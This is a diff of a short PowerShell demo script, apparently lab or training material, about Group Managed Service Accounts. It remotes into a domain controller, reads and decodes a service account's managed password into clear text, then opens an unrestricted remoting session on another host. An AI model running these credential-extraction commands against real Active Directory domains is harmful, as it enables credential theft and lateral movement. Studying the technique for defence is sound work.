@@ -2,12 +2,14 @@
     gMSA - Group Managed Service Account... 101
 #>
 
+Enter-PSSession -ComputerName dc01.igo.com -Credential $creds
 Get-ADServiceAccount -Identity svg_task -Properties 'msDS-ManagedPassword', PrincipalsAllowedToRetrieveManagedPassword -OutVariable gmsa
 
-$gmsa.PrincipalsAllowedToRetrieveManagedPassword
+$gmsa[0].PrincipalsAllowedToRetrieveManagedPassword
 
-(ConvertFrom-ADManagedPasswordBlob -Blob $gmsa.'msDS-ManagedPassword').CurrentPassword
+(ConvertFrom-ADManagedPasswordBlob -Blob $gmsa[0].'msDS-ManagedPassword').CurrentPassword
 
+Exit-PSSession
 
 # No constrains, we can do whatever we want!
 Enter-PSSession -ComputerName psu.igo.com -Credential $creds -ConfigurationName Raw
